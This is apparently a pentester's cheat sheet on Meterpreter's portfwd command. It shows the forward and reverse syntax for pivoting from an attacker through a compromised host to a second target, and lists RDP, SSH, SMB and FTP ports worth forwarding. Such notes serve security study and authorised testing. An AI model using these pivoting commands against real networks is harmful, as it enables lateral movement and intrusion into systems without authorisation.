# Meterpreter

## Portfwd
- /multi/manage/autoroute **NOT** **REQUIRED**

(Attacker) -> (Target1) -> (Target2)
- allows (Attacker) to reach (Target2) via meterpreter payload on (Target1)
- Local_Port = Port (Target1) is listening on
- Remote_Port = Port (Target1) is Forwarding
- Remote_Host = [IP] the port is forwarding to
- use 0.0.0.0 or 127.0.0.1:[Local_Port] from (Attacker) when trying to reach (Target2)
```bash
portfwd add -L 127.0.0.1 -l [Local_Port] -p [Remote_Port] -r [Remote_Host]
```
- Useful [Remote_Port]s
	- rdp (3389)
	- ssh (22)
	- smb (445)
	- ftp (21)

##### Portfwd (Reverse)
- Useful for connecting to (Attacker) HTTP server from (Target2)
- Attacker_Port = Port on (Attacker) that is being reached
- Local_Port = (Target1) port is Listening on
```bash
portfwd add -R -L 127.0.0.1 -l [Attacker_Port] -p [Local_Port]
```
- use (Target1) [IP] and [Local_Port] when forwarding
